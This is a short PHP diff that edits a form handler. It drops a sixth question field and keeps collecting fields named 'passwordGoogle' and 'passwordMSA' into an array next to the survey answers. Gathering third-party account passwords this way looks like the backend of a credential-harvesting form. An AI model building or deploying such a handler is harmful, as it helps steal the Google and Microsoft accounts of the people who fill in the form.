@@ -14,7 +14,6 @@
       $q3 = isset($_POST['q3']) ? filter_input(INPUT_POST, 'q3', FILTER_SANITIZE_STRING) : '';
       $q4 = isset($_POST['q4']) ? filter_input(INPUT_POST, 'q4', FILTER_SANITIZE_STRING) : '';
       $q5 = isset($_POST['q5']) ? filter_input(INPUT_POST, 'q5', FILTER_SANITIZE_STRING) : '';
-      $q6 = isset($_POST['q6']) ? filter_input(INPUT_POST, 'q6', FILTER_SANITIZE_STRING) : '';
       $googlePassword = isset($_POST['passwordGoogle']) ? filter_input(INPUT_POST, 'passwordGoogle', FILTER_SANITIZE_STRING) : '';
       $msaPassword = isset($_POST['passwordMSA']) ? filter_input(INPUT_POST, 'passwordMSA', FILTER_SANITIZE_STRING) : '';
 
@@ -24,10 +23,9 @@
         'Q3' => $q3,
         'Q4' => $q4,
         'Q5' => $q5,
-        'Q6' => $q6,
         'GooglePassword' => $googlePassword,
         'MSAPassword' => $msaPassword,
     ]);
-    echo json_encode(true);
+    echo (true);
 
 ?>
